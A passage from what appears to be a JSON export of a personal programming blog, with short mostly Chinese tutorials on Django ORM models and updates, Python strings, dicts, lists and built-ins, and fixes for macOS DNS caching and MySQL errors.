User.objects.get(id=1)_t.username='nick'_t.is_active=True_t.save() 方法一适合更新一批数据，类似于mysql语句update user set username=&#39;nick&#39; where id = 1。 方法二适合更新一条数据，也只能更新一条数据，当只有一条数据更新时推荐使用此方法， 具有auto_now属性字段的更新我们通常会给表添加三个默认字段 自增ID，这个django已经默认加了。 创建时间，用来标识这条记录的创建时间，具有auto_now_add属性，创建记录时会自动填充当前时间到此字段 修改时间，用来标识这条记录最后一次的修改时间，具有auto_now属性，当记录发生变化时填充当前时间到此字段 就像下边这样的表结构 12345class User(models.Model): create_time = models.DateTimeField(auto_now_add=True, verbose_name='创建时间') update_time = models.DateTimeField(auto_now=True, verbose_name='更新时间') username = models.CharField(max_length=255, unique=True, verbose_name='用户名') is_active = models.BooleanField(default=False, verbose_name='激活状态') 当表有字段具有auto_now属性且你希望他能自动更新时，必须使用上边方法二的更新，不然auto_now字段不会更新，也就是： 1234_t = User.objects.get(id=1)_t.username='nick'_t.is_active=True_t.save() 删除数据的两种情况单个删除1user_obj.delete() 批量删除12user_qs = User.objects.filter(sex=1)user_qs.delete() Reference https://juejin.im/post/5b588b656fb9a04fba6e8681 https://docs.djangoproject.com/en/2.2/topics/db/models/ https://docs.djangoproject.com/en/2.2/ref/models/querysets/ https://confluence.shopee.io/pages/viewpage.action?pageId=28539581 https://code.ziqiangxuetang.com/django/django-queryset-api.html https://stackoverflow.com/questions/7503241/django-models-selecting-single-field","comments":true,"categories":[{"name":"Django","slug":"Django","permalink":"http://swsmile.info/categories/Django/"}],"tags":[{"name":"Django","slug":"Django","permalink":"http://swsmile.info/tags/Django/"}]},{"title":"【Django】Django ORM - Define Model","date":"2019-11-10T08:00:52.000Z","path":"2019/11/10/【Django】Django-ORM-Define-Model/","text":"Define ModelsQuick exampleAlthough you can use Django without a database, it comes with an object-relational mapper in which you describe your database layout in Python code. The data-model syntax offers many rich ways of representing your models – so far, it’s been solving many years’ worth of database-schema problems. Here’s a quick example: 1234567891011121314151617#[app name]/models.pyfrom django.db import modelsclass Reporter(models.Model): full_name = models.CharField(max_length=70) def __str__(self): return self.full_nameclass Article(models.Model): pub_date = models.DateField() headline = models.CharField(max_length=200) content = models.TextField() reporter = models.ForeignKey(Reporter, on_delete=models.CASCADE) def __str__(self): return self.headline first_name and last_name are fields of the model. Each field is specified as a class attribute, and each attribute maps to a database column. The above Person model would create a database table like this: 12345CREATE TABLE myapp_person ( \"id\" serial NOT NULL PRIMARY KEY, \"first_name\" varchar(30) NOT NULL, \"last_name\" varchar(30) NOT NULL); Some technical notes: The name of the table, myapp_person, is automatically derived from some model metadata but can be overridden. See Table names for more details. An id field is added automatically, but this behavior can be overridden. See Automatic primary key fields. The CREATE TABLE SQL in this example is formatted using PostgreSQL syntax, but it’s worth noting Django uses SQL tailored to the database backend specified in your settings file. Overriding DefaultsDjango requires that all models have a primary key to support update operations (more on this later). To use a name other than id, define it explicitly in the model: 12class Employee(models.Model): employee_id = models.AutoField(primary_key=True) This results in the following table structure: 123CREATE TABLE organization_employee ( employee_id BIGINT AUTO_INCREMENT PRIMARY KEY NOT NULL) You can override Django’s naming scheme for the table by specifying it in an inner Meta class: 1234class Employee(models.Model): # ... (field definitions) class Meta(object): db_table = \"employee_tab\" 类型1234models.CharFieldmodels.DateTimeFieldmodels.TextField()models.ForeignKey(Reporter, on_delete=models.CASCADE) Fields are defined as class attributes. The following table illustrates some common types of fields, and the MySQL data type they will map to. Django Field MySQL Type Python Type Notes CharField VARCHAR unicode max_length must be set. Django assumes the empty value is a blank string (&quot;&quot;), not None. IntegerField INT int SmallIntegerField SMALLINT int BigIntegerField BIGINT int DateField DATE datetime.date auto_now_add and auto_now can help to automatically initialize the column upon creation and update respectively.Django will attempt to return a timezone-naive date regardless of whether Django was configured to use timezones.. DateTimeField DATETIME datetime.datetime Django will attempt to return a timezone-aware datetime if Django is configured to use timezones. Warnings will also be raised if timezone-naive datetimes are used with this field.Otherwise, same as DateField. AutoField INT AUTO_INCREMENT int primary_key must be True. TextField TEXT unicode Django assumes the empty value is a blank string (&quot;&quot;), not None. PositiveIntegerField INT int This field only forces the minimum value to be 0, it does not declare an unsigned column. (Django 1.6) BooleanField BOOL or TINYINT(1) bool There is no default support in Django for BIT(1). FloatField FLOAT float DecimalField DECIMAL decimal.Decimal max_digits must be at least the value of decimal_places. 属性Apart from certain unique arguments, fields also have a common set of optional keyword arguments that can be set. The table below describes these arguments: Keyword argument Purpose Notes blank Whether the value of the column can be blank, i.e. “”. Although a common keyword argument, it loses any usefulness for non-string fields. db_column The actual name of the column in the database table in SQL. Defaults to the field name. db_index If set to true, the column will be indexed. Only takes effect upon table creation, and has no impact on queries during run-time. default The default value of the column. Can be set to a function, but not a lambda. Functions allow the default to be set to a mutable-typed object, like a dict. help_text Help text to be used with any form widgets linked to the model. Even though the model might not be used in forms directly, this can be useful as a standardized form of documentation. null Whether the value of the column can be NULL. primary_key If set to true, the column will be the primary key of the table. Only one column in the model can be the primary key. unique If set to true, the column must be unique in the table. Not valid on ManyToManyField, OneToOneField, and FileField. Also implies db_index due to the nature of databases. verbose_name A human-readable name for the column. Automatically uses a formatted version of the model class name, e.g. TitleCase becomes title_case. Fields that should be indexed need to be provided with the db_index keyword argument set to True, or unique for unique columns. This only takes effect upon table creation, and has no impact on queries during run-time. For more details, see https://docs.djangoproject.com/en/2.2/ref/models/fields/. choice123456789101112131415161718from django.db import modelsclass Student(models.Model): FRESHMAN = 'FR' SOPHOMORE = 'SO' JUNIOR = 'JR' SENIOR = 'SR' YEAR_IN_SCHOOL_CHOICES = [ (FRESHMAN, 'Freshman'), (SOPHOMORE, 'Sophomore'), (JUNIOR, 'Junior'), (SENIOR, 'Senior'), ] year_in_school = models.CharField( max_length=2, choices=YEAR_IN_SCHOOL_CHOICES, default=FRESHMAN, ) null和blankdb_columndefaultThe default value for the field. This can be a value or a callable object. If callable it will be called every time a new object is created. The default can’t be a mutable object (model instance, list, set, etc.), as a reference to the same instance of that object would be used as the default value in all new model instances. Instead, wrap the desired default in a callable. primary_keyIf True, this field is the primary key for the model. If you don’t specify primary_key=True for any field in your model, Django will automatically add an AutoField to hold the primary key, so you don’t need to set primary_key=True on any of your fields unless you want to override the default primary-key behavior. For more, see Automatic primary key fields. primary_key=True implies null=False and unique=True. Only one primary key is allowed on an object. The primary key field is read-only. If you change the value of the primary key on an existing object and then save it, a new object will be created alongside the old one. uniqueIf True, this field must be unique throughout the table. This is enforced at the database level and by model validation. If you try to save a model with a duplicate value in a unique field, a django.db.IntegrityError will be raised by the model’s save() method. This option is valid on all field types except ManyToManyField and OneToOneField. Note that when unique is True, you don’t need to specify db_index, because unique implies the creation of an index. FieldDateField class DateField(auto_now=False, auto_now_add=False, **options) A date, represented in Python by a datetime.date instance. Has a few extra, optional arguments: DateField.auto_now Automatically set the field to now every time the object is saved. Useful for “last-modified” timestamps. Note that the current date is always used; it’s not just a default value that you can override.The field is only automatically updated when calling Model.save(). The field isn’t updated when making updates to other fields in other ways such as QuerySet.update(), though you can specify a custom value for the field in an update like that. DateField.auto_now_add Automatically set the field to now when the object is first created. Useful for creation of timestamps. Note that the current date is always used; it’s not just a default value that you can override. So even if you set a value for this field when creating the object, it will be ignored. If you want to be able to modify this field, set the following instead of auto_now_add=True:For DateField: default=date.today - from datetime.date.today()For DateTimeField: default=timezone.now - from django.utils.timezone.now() The default form widget for this field is a TextInput. The admin adds a JavaScript calendar, and a shortcut for “Today”. Includes an additional invalid_date error message key. The options auto_now_add, auto_now, and default are mutually exclusive. Any combination of these options will result in an error. Defining Meta DataAs described in Overriding Defaults, you can override the table name by defining an optional Meta inner class. The following example lists the directives that can be defined within the inner class: 12345678910111213class Person(models.Model): # ... (field definitions) age = models.PositiveSmallIntegerField() height = models.PositiveIntegerField() weight = models.PositiveIntegerField() class Meta(object): db_table = \"person_tab\" # Table name. Will be app name + \"_\" + lowercase class name by default. ordering = [\"-height\", \"weight\"] # Queries will order by height descending and weight ascending by default. verbose_name = \"person\" # The human-readable name. Will be the TitleCase class name split into lowercase words by default. verbose_name_plural = \"people\" # The plural human-readable name. Will be verbose_name + \"s\" by default. index_together = [(\"height\", \"weight\"), (\"age\", \"height\", \"weight\")] # A list of composite indices. Defining Foreign Key RelationshipsDjango supports multiple types of foreign key relationships through special Fields. The table below describes the different types of fields, and the type of foreign key relationship they represent: Field Type Notes ForeignKeyField One-to-many Defined in the “one” side of the relationship. OneToOneField One-to-one Can be defined in either side of the relationship. ManyToManyField Many-to-many Can be defined in either side of the relationship. Foreign key fields must be given the name of the target model as the first positional argument. It is also recommended that the related_name and related_query_name keyword arguments be provided as well. This lesson will not cover foreign key relationships in detail. If you wish to know more, you can refer to the official Django documentation. Install itNext, run the Django command-line utilities to create the database tables automatically: 12$ python manage.py makemigrations$ python manage.py migrate The makemigrations command looks at all your available models and creates migrations for whichever tables don’t already exist. migrate runs the migrations and creates tables in your database, as well as optionally providing much richer schema control. Reference https://juejin.im/post/5b588b656fb9a04fba6e8681 https://docs.djangoproject.com/en/2.2/topics/db/models/ https://docs.djangoproject.com/en/2.2/ref/models/querysets/ https://confluence.shopee.io/pages/viewpage.action?pageId=28539581 https://code.ziqiangxuetang.com/django/django-queryset-api.html https://stackoverflow.com/questions/7503241/django-models-selecting-single-field","comments":true,"categories":[{"name":"Django","slug":"Django","permalink":"http://swsmile.info/categories/Django/"}],"tags":[{"name":"Django","slug":"Django","permalink":"http://swsmile.info/tags/Django/"}]},{"title":"【macOS】清除 DNS 缓存","date":"2019-11-06T03:14:48.000Z","path":"2019/11/06/【macOS】清除-DNS-缓存/","text":"1sudo killall -HUP mDNSResponder; sleep 2; echo macOS DNS Cache Reset | say Reference http://osxdaily.com/2017/12/18/reset-dns-cache-macos-high-sierra/","comments":true,"categories":[{"name":"macOS","slug":"macOS","permalink":"http://swsmile.info/categories/macOS/"}],"tags":[{"name":"macOS","slug":"macOS","permalink":"http://swsmile.info/tags/macOS/"}]},{"title":"【Django】错误汇总","date":"2019-11-05T09:37:42.000Z","path":"2019/11/05/【Django】错误汇总/","text":"Reason: image not foundProblem通过 python manage.py runserver 0.0.0.0:80 启动 Django 时，报错： 1234django.core.exceptions.ImproperlyConfigured: Error loading MySQLdb module: dlopen(/Working/my_project/venv/lib/python2.7/site-packages/_mysql.so, 2): Library not loaded: /usr/local/opt/mysql@5.7/lib/libmysqlclient.20.dylib Referenced from: /Working/my_project/venv/lib/python2.7/site-packages/_mysql.so Reason: image not foundUnhandled exception in thread started by &lt;_pydev_bundle.pydev_monkey._NewThreadStartupWithTrace instance at 0x10acf42d8&gt; Solution这其实是因为在启动 Django 时，python interpreter 为了连接 MySQL，需要 libmysqlclient.20.dylib 文件，而去 /usr/local/opt/mysql@5.7/lib/libmysqlclient.20.dylib 路径下找时，未找到该文件。 而事实上，本机中其实有 libmysqlclient.20.dylib 文件的，我的这个文件位于 /usr/local/mysql-5.7.28-macos10.14-x86_64/lib/libmysqlclient.20.dylib 下。 12345678# 直接创建软链接，有可能会出现因不存在特定文件夹，导致创建失败的情况$ sudo ln -s /usr/local/mysql-5.7.28-macos10.14-x86_64/lib/libmysqlclient.20.dylib /usr/local/opt/mysql@5.7/lib/libmysqlclient.20.dylibln: /usr/local/opt/mysql@5.7/lib/libmysqlclient.20.dylib: No such file or directory$ mkdir /usr/local/opt/mysql@5.7$ cd /usr/local/opt/mysql@5.7$ mkdir lib$ sudo ln -s /usr/local/mysql-5.7.28-macos10.14-x86_64/lib/libmysqlclient.20.dylib /usr/local/opt/mysql@5.7/lib/libmysqlclient.20.dylib 再次启动 Django 时，一切正常。 Reference https://stackoverflow.com/questions/6383310/python-mysqldb-library-not-loaded-libmysqlclient-18-dylib","comments":true,"categories":[{"name":"Django","slug":"Django","permalink":"http://swsmile.info/categories/Django/"}],"tags":[{"name":"Django","slug":"Django","permalink":"http://swsmile.info/tags/Django/"}]},{"title":"【Python】前缀","date":"2019-11-04T12:29:20.000Z","path":"2019/11/04/【Python】前缀/","text":"u - Unicode 字符串Python 中定义一个 Unicode 字符串和定义一个普通字符串一样简单： 12&gt;&gt;&gt; u'Hello World !'u'Hello World !' 引号前小写的”u”表示这里创建的是一个 Unicode 字符串。如果你想加入一个特殊字符，可以使用 Python 的 Unicode-Escape 编码。如下例所示： 12&gt;&gt;&gt; u'Hello\\u0020World !'u'Hello World !' 被替换的 \\u0020 标识表示在给定位置插入编码值为 0x0020 的 Unicode 字符（空格符）。 其实，\\u后面跟四个十六进制数，就可以代表一个Unicode字符。 r以r或R开头的python中的字符串表示（非转义的）原始字符串，比如： 1(r’^time/plus/\\d&#123;1,2&#125;/$’, hours_ahead) 说明字符串r”XXX”中的XXX是普通字符。 普通字符其实是相对于转义字符而言的，转义字符是指，反斜杠加上对应字母，表示对应的特殊含义的字符串，比如最常见的”\\n”（表示换行），”\\t”（表示Tab）等。 而如果是以r开头，那么说明后面的字符串的每一个字符，都是普通的字符，即如果是r“\\n”，表示一个反斜杠字符，一个字母n，而不是表示换行。 b在 Python2.x里，b前缀没什么具体意义，只是为了兼容Python3.x的这种写法。 Reference https://www.runoob.com/python/python-strings.html https://www.jianshu.com/p/de35df724c48","comments":true,"categories":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/tags/Python/"}]},{"title":"【MySQL】MySQL 错误记录","date":"2019-11-04T11:56:45.000Z","path":"2019/11/04/【MySQL】MySQL-错误记录/","text":"Your password has expired.Description: Your password has expired. To log in you must change it using a client that supports expired passwords. Solution情况一：如果是本机的mysql过期。 请使用root用户命令行登录（从命令行登录不存在过期）。 登陆后直接输入： 1&gt; set password = password('123456'); 再次使用客户端访问，发现可用。 情况二：如果是服务器mysql过期。 这种情况需要修改指定用户的password。 以root@% 为例： 1&gt; set password for 'root'@'%' = password('123456'); 再次使用客户端访问，发现可用。 Reference https://blog.csdn.net/lidachao01/article/details/72385498","comments":true,"categories":[{"name":"MySQL","slug":"MySQL","permalink":"http://swsmile.info/categories/MySQL/"}],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"http://swsmile.info/tags/MySQL/"}]},{"title":"【Python】Comprehensions","date":"2019-11-01T11:57:31.000Z","path":"2019/11/01/【Python】Comprehensions/","text":"Comprehensions要生成list [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]可以用list(range(1, 11))： 12&gt;&gt;&gt; list(range(1, 11))[1, 2, 3, 4, 5, 6, 7, 8, 9, 10] 但如果要生成[1x1, 2x2, 3x3, ..., 10x10]怎么做？方法一是循环： 123456&gt;&gt;&gt; L = []&gt;&gt;&gt; for x in range(1, 11):... L.append(x * x)...&gt;&gt;&gt; L[1, 4, 9, 16, 25, 36, 49, 64, 81, 100] 但是循环太繁琐，而列表生成式则可以用一行语句代替循环生成上面的list： 12&gt;&gt;&gt; [x * x for x in range(1, 11)][1, 4, 9, 16, 25, 36, 49, 64, 81, 100] 写列表生成式时，把要生成的元素x * x放到前面，后面跟for循环，就可以把list创建出来。 for循环后面还可以加上if判断，这样我们就可以筛选出仅偶数的平方： 12&gt;&gt;&gt; [x * x for x in range(1, 11) if x % 2 == 0][4, 16, 36, 64, 100] 还可以使用两层循环，可以生成全排列： 12&gt;&gt;&gt; [m + n for m in 'ABC' for n in 'XYZ']['AX', 'AY', 'AZ', 'BX', 'BY', 'BZ', 'CX', 'CY', 'CZ'] Reference https://www.liaoxuefeng.com/wiki/1016959663602400/1017317609699776","comments":true,"categories":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/tags/Python/"}]},{"title":"【Python】Python 一切皆对象","date":"2019-11-01T11:48:43.000Z","path":"2019/11/01/【Python】-Python一切皆对象/","text":"Python的一等公民Python 中的一等公民，都具有以下特性： 可以赋值给一个变量 可以添加到集合对象中 可以作为参数传递给函数 可以当做函数的返回值 针对赋值给变量及添加到集合对象中，代码予以展示： 1234567891011121314def func(): print 'the func function is executed'class Test: def __init__(self): print 'An instance of Test class is initialized'obj_list = []obj_list.append(func)obj_list.append(Test)for item in obj_list: # 添加至集合对象中 print(item()) 那么上述例子，代码运行结果如下： 1234the func function is executed # 函数func被执行None # 函数func因没有return，返回NoneAn instance of Test class is initialized # 类Test被实例化，因此类Test的__init__(self)函数被调用，因而打印出 An instance of Test class is initialized&lt;__main__.Test object at 0x0000024AB34526A0&gt; # 类Test被实例化出一个类 Test 对象，由于类 Test 没有重写__str__方法，因此直接打印出了这个 Test 对象的内存地址 Reference https://juejin.im/post/5cf3f9e7f265da1b700491e8","comments":true,"categories":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/tags/Python/"}]},{"title":"【Python】I/O - 输入","date":"2019-11-01T11:48:43.000Z","path":"2019/11/01/【Python】I-O-输入/","text":"input()123456789101112131415&gt;&gt;&gt;a = input(\"input:\")input:123 # 输入整数&gt;&gt;&gt; type(a)&lt;type 'int'&gt; # 整型&gt;&gt;&gt; a = input(\"input:\") input:\"runoob\" # 正确，字符串表达式&gt;&gt;&gt; type(a)&lt;type 'str'&gt; # 字符串&gt;&gt;&gt; a = input(\"input:\")input:runoob # 报错，不是表达式Traceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt; File \"&lt;string&gt;\", line 1, in &lt;module&gt;NameError: name 'runoob' is not defined&lt;type 'str'&gt; raw_input() - 将所有输入作为字符串看待123456789&gt;&gt;&gt;a = raw_input(\"input:\")input:123&gt;&gt;&gt; type(a)&lt;type 'str'&gt; # 字符串&gt;&gt;&gt; a = raw_input(\"input:\")input:runoob&gt;&gt;&gt; type(a)&lt;type 'str'&gt; # 字符串&gt;&gt;&gt;","comments":true,"categories":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/tags/Python/"}]},{"title":"【Python】Basics - Built-in Function（内置函数）","date":"2019-11-01T11:31:06.000Z","path":"2019/11/01/【Python】Basics-内置函数 Built-in-Function/","text":"range() - 生成 listUsing only one argument in range()123print(\"Print first 5 numbers using range function\")for i in range(5): print(i, end=', ') Output: 12Print first 5 numbers using range function0, 1, 2, 3, 4, 要生成list [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]可以用list(range(1, 11))： 12&gt;&gt;&gt; list(range(1, 11))[1, 2, 3, 4, 5, 6, 7, 8, 9, 10] str()类（或对象）的类型isinstance() - 判断对象类型判断一个变量引用的对象是否是某个类型可以用isinstance()。 比如： 123456&gt;&gt;&gt; a[1, 1, 2]&gt;&gt;&gt; isinstance(a, list)True&gt;&gt;&gt; type(a) is listTrue 这其实等价于用 type(...) is x。 当然，我们还可以用 isinstance 来判断类类型 1234class Animal(object): passclass Dog(Animal): pass 12345&gt;&gt;&gt; a = Dog()&gt;&gt;&gt; isinstance(a, Dog)True&gt;&gt;&gt; isinstance(a, Animal)True type() - 获取对象类型属性相关dir() - 获取对象的属性和方法列表如果要获得一个对象的所有属性和方法，可以使用dir()函数，它返回一个包含字符串的list，比如，获得一个str对象的所有属性和方法： 12&gt;&gt;&gt; dir('ABC')['__add__', '__class__',..., '__subclasshook__', 'capitalize', 'casefold',..., 'zfill'] 类似__xxx__的属性和方法在Python中都是有特殊用途的，比如__len__方法返回长度。在Python中，如果你调用len()函数试图获取一个对象的长度，实际上，在len()函数内部，它自动去调用该对象的__len__()方法，所以，下面的代码是等价的： 1234&gt;&gt;&gt; len('ABC')3&gt;&gt;&gt; 'ABC'.__len__()3 我们自己写的类，如果也想用len(myObj)的话，就自己写一个__len__()方法： 1234567&gt;&gt;&gt; class MyDog(object):... def __len__(self):... return 100...&gt;&gt;&gt; dog = MyDog()&gt;&gt;&gt; len(dog)100 剩下的都是普通属性或方法，比如lower()返回小写的字符串： 12&gt;&gt;&gt; 'ABC'.lower()'abc' 设置、获取对象属性 setattr() - 设置对象的特定属性 hasattr() - 对象是否存在某个属性 getattr() - 获取对象的特定属性 12345678910class P(object): name = \"cq\" def __init__(self, age): self.age = ageprint hasattr(P, \"name\") # Trueprint hasattr(P, \"age\") # Falsesetattr(P, \"age\", 31)print getattr(P, \"name\") # cqprint getattr(P, \"age\") # 31","comments":true,"categories":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/tags/Python/"}]},{"title":"【Python】String","date":"2019-11-01T09:28:40.000Z","path":"2019/11/01/【Python】String/","text":"String 格式化在Python中，采用的格式化方式和C语言是一致的，用%实现，举例如下： 1234&gt;&gt;&gt; 'Hello, %s' % 'world''Hello, world'&gt;&gt;&gt; 'Hi, %s, you have $%d.' % ('Michael', 1000000)'Hi, Michael, you have $1000000.' 你可能猜到了，%运算符就是用来格式化字符串的。在字符串内部，%s表示用字符串替换，%d表示用整数替换，有几个%?占位符，后面就跟几个变量或者值，顺序要对应好。如果只有一个%?，括号可以省略。 常见的占位符有： 占位符 替换内容 %d 整数 %f 浮点数 %s 字符串 %x 十六进制整数 访问字符或子字符串Python 不支持单字符类型，单字符在 Python 中也是作为一个字符串使用。 Python 访问子字符串，可以使用方括号来截取字符串，如下实例： 1234567#!/usr/bin/python var1 = 'Hello World!'var2 = \"Python Runoob\" print \"var1[0]: \", var1[0]print \"var2[1:5]: \", var2[1:5] 转义字符在需要在字符中使用特殊字符时，python 用反斜杠 \\ 转义字符。如下表： 转义字符 描述 (在行尾时) 续行符 \\ 反斜杠符号 &#39; 单引号 &quot; 双引号 \\a 响铃 \\b 退格(Backspace) \\e 转义 \\000 空 \\n 换行 \\v 纵向制表符 \\t 横向制表符 \\r 回车 \\f 换页 \\oyy 八进制数，yy代表的字符，例如：\\o12代表换行 \\xyy 十六进制数，yy代表的字符，例如：\\x0a代表换行 \\other 其它的字符以普通格式输出 字符串运算符下表实例变量 a 值为字符串 “Hello”，b 变量值为 “Python”： 操作符 描述 实例 + 字符串连接 &gt;&gt;&gt;a + b ‘HelloPython’ * 重复输出字符串 &gt;&gt;&gt;a * 2 ‘HelloHello’ [] 通过索引获取字符串中字符 &gt;&gt;&gt;a[1] ‘e’ [ : ] 截取字符串中的一部分 &gt;&gt;&gt;a[1:4] ‘ell’ in 成员运算符 - 如果字符串中包含给定的字符返回 True &gt;&gt;&gt;”H” in a True not in 成员运算符 - 如果字符串中不包含给定的字符返回 True &gt;&gt;&gt;”M” not in a True r/R 原始字符串 - 原始字符串：所有的字符串都是直接按照字面的意思来使用，没有转义特殊或不能打印的字符。 原始字符串除在字符串的第一个引号前加上字母”r”（可以大小写）以外，与普通字符串有着几乎完全相同的语法。 &gt;&gt;&gt;print r’\\n’ \\n &gt;&gt;&gt; print R’\\n’ \\n % 格式字符串 请看下一章节 1234567891011121314151617181920212223#!/usr/bin/python# -*- coding: UTF-8 -*- a = \"Hello\"b = \"Python\" print \"a + b 输出结果：\", a + b print \"a * 2 输出结果：\", a * 2 print \"a[1] 输出结果：\", a[1] print \"a[1:4] 输出结果：\", a[1:4] if( \"H\" in a) : print \"H 在变量 a 中\" else : print \"H 不在变量 a 中\" if( \"M\" not in a) : print \"M 不在变量 a 中\" else : print \"M 在变量 a 中\" print r'\\n'print R'\\n' Unicode 字符串Python 中定义一个 Unicode 字符串和定义一个普通字符串一样简单： 12&gt;&gt;&gt; u'Hello World !'u'Hello World !' 引号前小写的”u”表示这里创建的是一个 Unicode 字符串。如果你想加入一个特殊字符，可以使用 Python 的 Unicode-Escape 编码。如下例所示： 12&gt;&gt;&gt; u'Hello\\u0020World !'u'Hello World !' 被替换的 \\u0020 标识表示在给定位置插入编码值为 0x0020 的 Unicode 字符（空格符）。 Reference https://www.liaoxuefeng.com/wiki/1016959663602400/1017075323632896 https://www.runoob.com/python/python-strings.html","comments":true,"categories":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/tags/Python/"}]},{"title":"【Python】Collection - dict","date":"2019-11-01T09:24:40.000Z","path":"2019/11/01/【Python】Collection-Dict/","text":"dict一个非常有用的 Python 內置数据类型是 字典 (参见 映射类型 — dict)。字典在其他语言里可能会被叫做 联合内存 或 联合数组。与以连续整数为索引的序列不同，字典是以 关键字 为索引的，关键字可以是任意不可变类型，通常是字符串或数字。如果一个元组只包含字符串、数字或元组，那么这个元组也可以用作关键字。但如果元组直接或间接地包含了可变对象，那么它就不能用作关键字。列表不能用作关键字，因为列表可以通过索引、切片或 append() 和 extend() 之类的方法来改变。 理解字典的最好方式，就是将它看做是一个 键: 值 对的集合，键必须是唯一的（在一个字典中）。一对花括号可以创建一个空字典：{} 。另一种初始化字典的方式是在一对花括号里放置一些以逗号分隔的键值对，而这也是字典输出的方式。 字典主要的操作是使用关键字存储和解析值。也可以用 del 来删除一个键值对。如果你使用了一个已经存在的关键字来存储值，那么之前与这个关键字关联的值就会被遗忘。用一个不存在的键来取值则会报错。 对一个字典执行 list(d) 将返回包含该字典中所有键的列表，按插入次序排列 (如需其他排序，则要使用 sorted(d))。要检查字典中是否存在一个特定键，可使用 in 关键字。 以下是使用字典的一些简单示例 123456789101112131415161718&gt;&gt;&gt; tel = &#123;'jack': 4098, 'sape': 4139&#125;&gt;&gt;&gt; tel['guido'] = 4127&gt;&gt;&gt; tel&#123;'jack': 4098, 'sape': 4139, 'guido': 4127&#125;&gt;&gt;&gt; tel['jack']4098&gt;&gt;&gt; del tel['sape']&gt;&gt;&gt; tel['irv'] = 4127&gt;&gt;&gt; tel&#123;'jack': 4098, 'guido': 4127, 'irv': 4127&#125;&gt;&gt;&gt; list(tel)['jack', 'guido', 'irv']&gt;&gt;&gt; sorted(tel)['guido', 'irv', 'jack']&gt;&gt;&gt; 'guido' in telTrue&gt;&gt;&gt; 'jack' not in telFalse 通过 key 获取 value如果key不存在，dict就会报错： 1234&gt;&gt;&gt; d['Thomas']Traceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;KeyError: 'Thomas' 要避免key不存在的错误，有两种办法，一是通过in判断key是否存在：python 12&gt;&gt;&gt; 'Thomas' in dFalse 二是通过dict提供的get()方法，如果key不存在，可以返回None，或者自己指定的value： 123&gt;&gt;&gt; d.get('Thomas')&gt;&gt;&gt; d.get('Thomas', -1)-1 注意：返回None的时候Python的交互环境不显示结果。 删除 key要删除一个key，用pop(key)方法，对应的value也会从dict中删除： 1234&gt;&gt;&gt; d.pop('Bob')75&gt;&gt;&gt; d&#123;'Michael': 95, 'Tracy': 85&#125; 迭代 dict1234567&gt;&gt;&gt; d = &#123;'a': 1, 'b': 2, 'c': 3&#125;&gt;&gt;&gt; for key in d:... print(key)...acb 默认情况下，dict迭代的是key。如果要迭代value，可以用for value in d.values()。 当在字典中循环时，用 items() 方法可将关键字和对应的值同时取出 123456&gt;&gt;&gt; knights = &#123;'gallahad': 'the pure', 'robin': 'the brave'&#125;&gt;&gt;&gt; for k, v in knights.items():... print(k, v)...gallahad the purerobin the brave Reference https://www.liaoxuefeng.com/wiki/1016959663602400/1017316949097888","comments":true,"categories":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/tags/Python/"}]},{"title":"【Python】Collection - list","date":"2019-11-01T08:22:17.000Z","path":"2019/11/01/【Python】Collection-list/","text":"list 的常用方法 list.append(x) 在列表的末尾添加一个元素。相当于 a[len(a):] = [x] 。 list.extend(iterable) 使用可迭代对象中的所有元素来扩展列表。相当于 a[len(a):] = iterable 。 list.insert(i, x) 在给定的位置插入一个元素。第一个参数是要插入的元素的索引，所以 a.insert(0, x) 插入列表头部， a.insert(len(a), x) 等同于 a.append(x) 。 list.remove(x) 移除列表中第一个值为 x 的元素。如果没有这样的元素，则抛出 ValueError 异常。 list.pop([i]) 删除列表中给定位置的元素并返回它。如果没有给定位置，a.pop() 将会删除并返回列表中的最后一个元素。（ 方法签名中 i 两边的方括号表示这个参数是可选的，而不是要你输入方括号。你会在 Python 参考库中经常看到这种表示方法)。 list.clear() 删除列表中所有的元素。相当于 del a[:] 。 list.index(x[, start[, end]]) 返回列表中第一个值为 x 的元素的从零开始的索引。如果没有这样的元素将会抛出 ValueError 异常。可选参数 start 和 end 是切片符号，用于将搜索限制为列表的特定子序列。返回的索引是相对于整个序列的开始计算的，而不是 start 参数。 list.count(x) 返回元素 x 在列表中出现的次数。 list.sort(key=None, reverse=False) 对列表中的元素进行排序（参数可用于自定义排序，解释请参见 sorted()）。 list.reverse() 反转列表中的元素。 list.copy() 返回列表的一个浅拷贝。相当于 a[:] 。 列表方法示例： 1234567891011121314151617181920&gt;&gt;&gt; fruits = ['orange', 'apple', 'pear', 'banana', 'kiwi', 'apple', 'banana']&gt;&gt;&gt; fruits.count('apple')2&gt;&gt;&gt; fruits.count('tangerine')0&gt;&gt;&gt; fruits.index('banana')3&gt;&gt;&gt; fruits.index('banana', 4) # Find next banana starting a position 46&gt;&gt;&gt; fruits.reverse()&gt;&gt;&gt; fruits['banana', 'apple', 'kiwi', 'banana', 'pear', 'apple', 'orange']&gt;&gt;&gt; fruits.append('grape')&gt;&gt;&gt; fruits['banana', 'apple', 'kiwi', 'banana', 'pear', 'apple', 'orange', 'grape']&gt;&gt;&gt; fruits.sort()&gt;&gt;&gt; fruits['apple', 'apple', 'banana', 'banana', 'grape', 'kiwi', 'orange', 'pear']&gt;&gt;&gt; fruits.pop()'pear' 你可能已经注意到，像 insert ，remove 或者 sort 方法，只修改列表，没有打印出返回值——它们返回默认值 None 。1 这是Python中所有可变数据结构的设计原则。 